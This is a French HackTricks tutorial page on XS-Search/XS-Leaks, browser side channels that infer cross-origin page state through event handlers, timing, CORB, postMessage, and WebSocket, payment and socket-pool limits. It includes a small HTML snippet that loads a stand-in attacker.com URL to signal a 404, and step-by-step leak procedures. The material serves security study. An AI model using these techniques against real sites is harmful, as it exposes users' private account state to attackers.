# XS-Search/XS-Leaks

![](<../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

XS-Search est une technique orient√©e vers l'exfiltration d'informations entre origines en exploitant des attaques par canal secondaire.

Il existe diff√©rents √©l√©ments dans ce type d'attaque :

* **Web vuln√©rable** : c'est le web √† partir duquel nous voulons exfiltrer des informations
* **Web de l'attaquant** : c'est le web que l'attaquant cr√©e contenant l'exploit et auquel la victime acc√®de
* **M√©thode d'inclusion** : c'est la m√©thode utilis√©e pour charger le Web vuln√©rable √† partir du Web de l'attaquant (comme window.open, iframe, fetch, balise HTML avec href...)
* **Technique de fuite** : apr√®s avoir acc√©d√© au web vuln√©rable, une technique sera utilis√©e pour diff√©rencier entre l'√©tat potentiel du web avec les informations obtenues √† partir de la m√©thode d'inclusion utilis√©e.
* **√âtats** : les 2 √©tats possibles que le web vuln√©rable peut avoir en fonction de la victime que nous voulons diff√©rencier.
* **Diff√©rences d√©tectables** : il s'agit des informations que l'attaquant doit essayer de d√©cider de l'√©tat du web vuln√©rable.

### Diff√©rences d√©tectables

Afin de distinguer entre les 2 √©tats de la page vuln√©rable, plusieurs √©l√©ments peuvent √™tre examin√©s :

* **Code d'√©tat**. Un attaquant peut distinguer les **diff√©rents codes d'√©tat de r√©ponse HTTP** entre origines (par exemple, erreurs serveur, erreurs client ou erreurs d'authentification).
* **Utilisation de l'API**. Cette diff√©rence d√©tectable permet √† un attaquant de d√©tecter l'**utilisation des API Web** sur les pages, ce qui lui permet de d√©duire si une page entre origines utilise une API Web JavaScript sp√©cifique.
* **Redirections**. Il est possible de d√©tecter si une application web a **redirig√© l'utilisateur vers une autre page**. Cela ne se limite pas aux redirections HTTP, mais inclut √©galement les redirections d√©clench√©es par JavaScript ou HTML.
* **Contenu de la page**. Ces **diff√©rences d√©tectables apparaissent dans le corps de la r√©ponse HTTP** lui-m√™me ou dans les sous-ressources incluses par la page. Par exemple, cela pourrait √™tre le **nombre de frames incluses** (cf. XS-Leak sur Gitlab) ou les diff√©rences de taille des images.
* **En-t√™te HTTP**. Un attaquant peut d√©tecter la pr√©sence d'un **en-t√™te de r√©ponse HTTP sp√©cifique** et peut √™tre en mesure de recueillir sa valeur. Cela inclut des en-t√™tes tels que X-Frame-Options, Content-Disposition et Cross-Origin-Resource-Policy.
* **Timing** : Un attaquant peut d√©tecter qu'il existe une diff√©rence de temps constante entre 2 √©tats.

### M√©thodes d'inclusion

* **√âl√©ments HTML**. HTML offre une vari√©t√© d'√©l√©ments qui permettent l'**inclusion de ressources entre origines**. Des √©l√©ments tels que les feuilles de style, les images ou les scripts obligent le navigateur de la victime √† demander une ressource non-HTML sp√©cifi√©e. Une liste √©num√©rant les √©l√©ments HTML possibles √† cette fin est disponible en ligne ([https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)).
* **Frames**. Des √©l√©ments tels que **iframe**, **object** et **embed** peuvent incorporer directement d'autres ressources HTML dans la page de l'attaquant. Si la page ne **prot√®ge pas contre l'encadrement**, le code JavaScript peut acc√©der √† l'objet window de la ressource encadr√©e via la propri√©t√© contentWindow.
* **Pop-ups**. La m√©thode **`window.open`** charge une ressource dans un nouvel onglet ou une nouvelle fen√™tre du navigateur. La m√©thode renvoie une **poign√©e de fen√™tre** que le code JavaScript peut utiliser pour acc√©der aux m√©thodes et propri√©t√©s, conformes √† la SOP. Ces pop-ups sont souvent utilis√©s dans la connexion unique. Les navigateurs modernes n'autorisent les pop-ups que s'ils sont d√©clench√©s par certaines interactions de l'utilisateur. Pour les attaques XS-Leak, cette m√©thode est particuli√®rement utile car elle **contourne les restrictions d'encadrement et de cookies pour une ressource cible**. Les versions plus r√©centes des navigateurs ont r√©cemment ajout√© des moyens d'isoler les poign√©es de fen√™tre.
* **Requ√™tes JavaScript**. JavaScript permet d'envoyer des requ√™tes directement aux ressources cibles. Il existe deux fa√ßons diff√©rentes √† cette fin : les **XMLHttpRequests** et son successeur **Fetch** **API**. Contrairement aux m√©thodes d'inclusion pr√©c√©dentes, un attaquant a un contr√¥le pr√©cis sur la requ√™te √©mise, par exemple, s'il faut suivre automatiquement une redirection HTTP.
### Techniques de fuite

* **Gestionnaire d'√©v√©nements**. Le gestionnaire d'√©v√©nements peut √™tre consid√©r√© comme la technique de fuite classique pour les XS-Leaks. Ils sont une source bien connue de diverses informations. Par exemple, le d√©clenchement de **onload** indique un chargement r√©ussi des ressources contrairement √† l'√©v√©nement onerror.
* **Messages d'erreur**. Au-del√† des gestionnaires d'√©v√©nements, les messages d'erreur peuvent se produire sous forme d'**exceptions JavaScript** et de **pages d'erreur sp√©ciales**. Les messages d'erreur peuvent √™tre lanc√©s √† diff√©rentes √©tapes, par exemple, directement par la technique de fuite. La technique de fuite peut utiliser soit des **informations** suppl√©mentaires directement **contenues** dans le **message d'erreur**, soit distinguer entre l'**apparition et l'absence d'un message d'erreur**.
* **Limites globales**. Chaque ordinateur a ses limites physiques, tout comme un navigateur. Par exemple, la quantit√© de m√©moire disponible limite les onglets en cours d'ex√©cution d'un navigateur. Il en va de m√™me pour d'autres limites du navigateur qui sont appliqu√©es √† l'ensemble du navigateur. Si un attaquant peut d√©terminer **quand la limite est atteinte, cela peut √™tre utilis√© comme une technique de fuite**.
* **√âtat global**. Les navigateurs ont des **√©tats globaux avec lesquels toutes les pages peuvent interagir**. Si cette interaction est d√©tectable √† partir du site d'un attaquant, elle peut √™tre utilis√©e comme une technique de fuite. Par exemple, l'interface **History** permet de manipuler les pages visit√©es dans un onglet ou une frame. Cela cr√©e un √©tat global car le **nombre d'entr√©es** permet √† un attaquant de tirer des conclusions sur les pages de diff√©rentes origines.
* **API de performance**. L'API de performance est utilis√©e pour acc√©der aux **informations de performance de la page actuelle**. Leurs entr√©es comprennent des donn√©es d√©taill√©es sur le chronom√©trage du r√©seau pour le document et chaque ressource charg√©e par la page. Cela permet √† un attaquant de tirer des **conclusions sur les ressources demand√©es**. Par exemple, nous avons identifi√© des cas o√π les navigateurs ne cr√©ent pas d'entr√©es de performance pour certaines requ√™tes.
* **Attributs lisibles**. HTML dispose de plusieurs **attributs lisibles entre les origines**. Cet acc√®s en lecture peut √™tre utilis√© comme une technique de fuite. Par exemple, le code JavaScript peut lire le nombre de frames incluses dans une page Web entre les origines avec la propri√©t√© window.frame.length.

#### **Techniques bas√©es sur le timing**

Certaines des techniques suivantes vont utiliser le timing comme partie du processus pour d√©tecter les diff√©rences dans les √©tats possibles des pages Web. Il existe diff√©rentes fa√ßons de mesurer le temps dans un navigateur Web.

**Horloges** : L'API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permet aux d√©veloppeurs d'obtenir des mesures de chronom√©trage de haute r√©solution.\
Il existe un nombre consid√©rable d'API que les attaquants peuvent exploiter pour cr√©er des horloges implicites : [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), les animations CSS, et autres.\
Pour plus d'informations : [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## XSinator

XSinator est un outil automatique pour **v√©rifier les navigateurs contre plusieurs XS-Leaks connus** expliqu√©s dans son document : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
Vous pouvez acc√©der √† l'outil sur [https://xsinator.com/](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks exclus** : Nous avons d√ª exclure les XS-Leaks qui d√©pendent des **service workers** car ils interf√©reraient avec d'autres fuites dans XSinator. De plus, nous avons choisi d'**exclure les XS-Leaks qui d√©pendent d'une mauvaise configuration et de bugs dans une application Web sp√©cifique**. Par exemple, les mauvaises configurations de Cross-Origin Resource Sharing (CORS), les fuites de postMessage ou les attaques de type Cross-Site Scripting. De plus, nous avons exclu les XS-Leaks bas√©s sur le temps car ils souffrent souvent d'une lenteur, d'un bruit et d'une impr√©cision.
{% endhint %}

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Techniques de gestionnaire d'√©v√©nements

### Onload/Onerror

* **M√©thodes d'inclusion** : Frames, √âl√©ments HTML
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'informations** : [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **R√©sum√©** : si on essaie de charger une ressource, les √©v√©nements onerror/onload sont d√©clench√©s lorsque la ressource est charg√©e avec succ√®s/√©chec, il est possible de d√©terminer le code d'√©tat.
* **Exemple de code** : [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

L'exemple de code essaie de **charger des objets scripts depuis JS**, mais **d'autres balises** telles que les objets, les feuilles de style, les images, les audios pourraient √©galement √™tre utilis√©es. De plus, il est √©galement possible d'injecter directement la **balise** et de d√©clarer les √©v√©nements `onload` et `onerror` √† l'int√©rieur de la balise (au lieu de l'injecter depuis JS).

Il existe √©galement une version sans script de cette attaque :
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Dans ce cas, si `example.com/404` n'est pas trouv√©, `attacker.com/?error` sera charg√©.

### Timing de chargement

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **R√©sum√©**: L'API \*\*\*\* [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. Cependant, d'autres horloges pourraient √™tre utilis√©es, telles que l'API [**PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) qui peut identifier les t√¢ches s'ex√©cutant pendant plus de 50 ms.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un autre exemple dans:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Timing de chargement + T√¢che lourde forc√©e

Cette technique est similaire √† la pr√©c√©dente, mais l'**attaquant** va √©galement **forcer** une action √† prendre un **temps significatif** lorsque la **r√©ponse est positive ou n√©gative** et mesurer ce temps.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Timing de d√©chargement/avant d√©chargement

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **R√©sum√©**: L'horloge [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Les √©v√©nements [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) et [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) peuvent √™tre utilis√©s pour mesurer le temps n√©cessaire pour r√©cup√©rer une ressource. Cela fonctionne car **`beforeunload`** est d√©clench√© lorsque le navigateur **effectue une nouvelle demande de navigation**, tandis que **`unload`** est d√©clench√© lorsque cette **navigation se produit r√©ellement**. Gr√¢ce √† ce comportement, il est possible de calculer la diff√©rence de temps entre ces deux √©v√©nements et de mesurer le **temps qu'il a fallu au navigateur pour terminer le chargement de la ressource**.

### Timing de frame sandbox + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **R√©sum√©**: L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Si une page n'a pas mis en place de [protections de cadrage](https://xsleaks.dev/docs/defenses/opt-in/xfo/), un attaquant peut mesurer le temps n√©cessaire pour que la page et toutes les sous-ressources se chargent via le r√©seau. Par d√©faut, le gestionnaire `onload` d'un iframe est invoqu√© apr√®s que toutes les ressources ont √©t√© charg√©es et que tout le JavaScript a fini de s'ex√©cuter. Cependant, un attaquant peut √©liminer le bruit de l'ex√©cution du script en incluant l'attribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dans la balise `<iframe>`. Cet attribut bloque de nombreuses fonctionnalit√©s, y compris l'ex√©cution de JavaScript, ce qui permet d'obtenir une mesure presque pure du r√©seau.

### #ID + error + onload

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**:
* **R√©sum√©**: Si vous pouvez provoquer une erreur sur la page lorsque le contenu correct est consult√© et la charger correctement lorsque n'importe quel contenu est consult√©, vous pouvez cr√©er une boucle pour extraire toutes les informations sans mesurer le temps.
* **Exemple de code**:

Supposons que vous puissiez **ins√©rer** la **page** qui contient le **contenu secret** √† l'int√©rieur d'un iframe.

Vous pouvez faire en sorte que la victime recherche le fichier contenant "_**flag**_" en utilisant un iframe (en exploitant par exemple une CSRF). √Ä l'int√©rieur de l'iframe, vous savez que l'√©v√©nement _**onload**_ sera **toujours ex√©cut√© au moins une fois**. Ensuite, vous pouvez **modifier** l'**URL** de l'**iframe** en ne changeant que le **contenu** du **hash** dans l'URL.

Par exemple:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la premi√®re URL a √©t√© **charg√©e avec succ√®s**, alors, en **modifiant** la partie **hash** de l'URL, l'√©v√©nement **onload** ne sera **pas d√©clench√© √† nouveau**. Mais **si** la page a rencontr√© une **erreur** lors du **chargement**, alors, l'√©v√©nement **onload** sera **d√©clench√© √† nouveau**.

Ainsi, vous pouvez **distinguer** une page **charg√©e correctement** d'une page qui pr√©sente une **erreur** lorsqu'elle est consult√©e.

### Ex√©cution de JavaScript

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**:
* **R√©sum√©**: Si la **page** renvoie le **contenu sensible**, ou un **contenu** pouvant √™tre **contr√¥l√©** par l'utilisateur. L'utilisateur pourrait d√©finir un **code JS valide dans le cas n√©gatif**, et charger chaque essai √† l'int√©rieur de balises `<script>`, de sorte que dans les cas **n√©gatifs**, le **code des attaquants est ex√©cut√©**, et dans les cas **affirmatifs**, **rien** ne sera ex√©cut√©.
* **Exemple de code**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}
### CORB - Onerror

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Code d'√©tat et en-t√™tes
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **R√©sum√©**: Les attaquants peuvent observer si CORB est appliqu√© si une r√©ponse renvoie un `Content-Type` prot√©g√© par CORB (et `nosniff`) avec le code d'√©tat `2xx`, ce qui entra√Æne le retrait du corps et des en-t√™tes de la r√©ponse par CORB. La d√©tection de cette protection permet √† un attaquant de **d√©voiler** la combinaison du **code d'√©tat** (succ√®s ou erreur) et du **`Content-Type` (prot√©g√© par CORB ou non).**
* **Exemple de code**:

Consultez le lien pour plus d'informations sur l'attaque.

### onblur

* **M√©thodes d'inclusion**: Cadres
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **R√©sum√©**: Fuite de donn√©es sensibles √† partir de l'attribut id ou name.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Il est possible de **charger une page** √† l'int√©rieur d'un **iframe** et d'utiliser **`#id_value`** pour que la page se **concentre sur l'√©l√©ment** de l'iframe indiqu√©, puis si un signal **`onblur`** est d√©clench√©, l'√©l√©ment ID existe.\
Vous pouvez effectuer la m√™me attaque avec des balises **`portal`**.

### Diffusions de postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©thodes d'inclusion**: Cadres, Pop-ups
* **Diff√©rence d√©tectable**: Utilisation de l'API
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **R√©sum√©**: Rassembler des informations sensibles √† partir d'un postMessage ou utiliser la pr√©sence de postMessages comme un oracle pour conna√Ætre l'√©tat de l'utilisateur sur la page.
* **Exemple de code**: `Any code listening for all postMessages.`

Les applications utilisent souvent des **diffusions de postMessage** pour partager des informations avec d'autres origines. En √©coutant ces messages, on peut trouver des **informations sensibles** (potentiellement si le param√®tre `targetOrigin` n'est pas utilis√©). De plus, le fait de recevoir un message peut √™tre **utilis√© comme un oracle** (vous ne recevez ce type de message que si vous √™tes connect√©).

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Techniques de limites globales

### API WebSocket

* **M√©thodes d'inclusion**: Cadres, Pop-ups
* **Diff√©rence d√©tectable**: Utilisation de l'API
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **R√©sum√©**: √âpuiser la limite de connexion WebSocket r√©v√®le le nombre de connexions WebSocket d'une page cross-origin.
* **Exemple de code**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Il est possible d'identifier si, et combien, une page cible utilise des **connexions WebSocket**. Cela permet √† un attaquant de d√©tecter les √©tats de l'application et de divulguer des informations li√©es au nombre de connexions WebSocket.

Si une **origine** utilise le **nombre maximal d'objets de connexion WebSocket**, ind√©pendamment de leur √©tat de connexion, la cr√©ation de **nouveaux objets entra√Ænera des exceptions JavaScript**. Pour ex√©cuter cette attaque, le site de l'attaquant ouvre le site cible dans une fen√™tre pop-up ou un iframe, puis, une fois que le site cible est charg√©, tente de cr√©er le nombre maximal de connexions WebSocket possible. Le **nombre d'exceptions lev√©es** correspond au **nombre de connexions WebSocket utilis√©es par la fen√™tre du site cible**.

### API de paiement

* **M√©thodes d'inclusion**: Cadres, Pop-ups
* **Diff√©rence d√©tectable**: Utilisation de l'API
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **R√©sum√©**: D√©tecter une demande de paiement car une seule peut √™tre active √† la fois.
* **Exemple de code**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Cette XS-Leak permet √† un attaquant de **d√©tecter quand une page cross-origin initie une demande de paiement**.

√âtant donn√© que **seule une demande de paiement peut √™tre active** √† la fois, si le site cible utilise l'API de demande de paiement, toute **tentative ult√©rieure d'utiliser cette API √©chouera** et provoquera une **exception JavaScript**. L'attaquant peut exploiter cela en **tentant p√©riodiquement d'afficher l'interface de l'API de paiement**. Si une tentative provoque une exception, le site cible l'utilise actuellement. L'attaquant peut masquer ces tentatives p√©riodiques en fermant imm√©diatement l'interface apr√®s sa cr√©ation.

### Mesure de la boucle d'√©v√©nements <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M√©thodes d'inclusion**:
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **R√©sum√©**: Mesurer le temps d'ex√©cution d'un site en abusant de la boucle d'√©v√©nements JavaScript √† thread unique.
* **Exemple de code**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

Le mod√®le de concurrence de JavaScript repose sur une [boucle d'√©v√©nements √† thread unique](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), ce qui signifie qu'il ne peut ex√©cuter qu'une t√¢che √† la fois.\
En d√©duisant **combien de temps le code d'une autre origine met √† s'ex√©cuter** en mesurant le temps qu'il met √† s'ex√©cuter ensuite dans la file d'attente des √©v√©nements. L'attaquant envoie continuellement des √©v√©nements √† la boucle d'√©v√©nements avec des propri√©t√©s fixes, qui seront finalement envoy√©s s'il n'y a plus rien dans la file d'attente. D'autres origines envoient des √©v√©nements √† la m√™me file d'attente, et c'est l√† que l'**attaquant d√©duit la diff√©rence de temps en d√©tectant si un retard s'est produit avec l'une de ses t√¢ches**.

{% hint style="warning" %}
Lors d'une mesure de temps d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}
### Boucle d'√©v√©nements occup√©e <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©thodes d'inclusion**:
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **R√©sum√©**: Mesurer le temps d'ex√©cution d'un verrouillage web de la boucle d'√©v√©nements d'un thread et chronom√©trer **combien de temps il faut pour que la boucle d'√©v√©nements redevienne disponible**.
* **Exemple de code**:

L'un des principaux avantages de cette technique est sa capacit√© √† contourner l'isolation des sites, car une origine d'attaquant peut influencer l'ex√©cution d'une autre origine.

{% hint style="warning" %}
Dans un timing d'ex√©cution, il est possible de **√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Pool de connexions

* **M√©thodes d'inclusion**: Requ√™tes JavaScript
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **R√©sum√©**: Un attaquant pourrait bloquer toutes les sockets sauf une, charger la page cible et en m√™me temps charger une autre page, le temps jusqu'√† ce que la derni√®re page commence √† se charger est le temps que la page cible a mis √† se charger.
* **Exemple de code**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Les navigateurs utilisent des sockets pour communiquer avec les serveurs. Comme le syst√®me d'exploitation et le mat√©riel sur lequel il s'ex√©cute ont des ressources limit√©es, **les navigateurs doivent imposer une limite**. Pour exploiter l'existence de cette limite, les attaquants peuvent :

1. V√©rifier quelle est la limite du navigateur, par exemple 256 sockets globales.
2. Bloquer 255 sockets pendant une longue p√©riode en effectuant 255 requ√™tes vers des h√¥tes diff√©rents qui suspendent simplement la connexion.
3. Utiliser la 256e socket en effectuant une requ√™te vers la page cible.
4. Effectuer une 257e requ√™te vers un autre h√¥te. √âtant donn√© que toutes les sockets sont utilis√©es (aux √©tapes 2 et 3), cette requ√™te doit attendre que le pool re√ßoive une socket disponible. Cette p√©riode d'attente fournit √† l'attaquant le timing r√©seau de la 256e socket, qui appartient √† la page cible. Cela fonctionne parce que les 255 sockets de l'√©tape 2 sont toujours bloqu√©es, donc si le pool a re√ßu une socket disponible, c'est parce que la socket a √©t√© lib√©r√©e √† l'√©tape 3. Le temps de lib√©ration de la 256e socket est directement li√© au temps n√©cessaire pour terminer la requ√™te.

Pour plus d'informations : [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de connexions par destination

* **M√©thodes d'inclusion**: Requ√™tes JavaScript
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**:
* **R√©sum√©**: C'est comme la technique pr√©c√©dente, mais au lieu d'utiliser toutes les sockets, Google **Chrome** limite √† **6 requ√™tes simultan√©es vers la m√™me origine**. Si nous **bloquons 5** et ensuite **lan√ßons une 6e** requ√™te, nous pouvons **chronom√©trer** celle-ci et si nous parvenons √† faire en sorte que la **page victime envoie** plus de **requ√™tes** vers le m√™me point de terminaison pour d√©tecter un **√©tat** de la **page**, la **6e requ√™te** prendra **plus de temps** et nous pourrons le d√©tecter.

##

![](<../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Techniques de l'API de performance

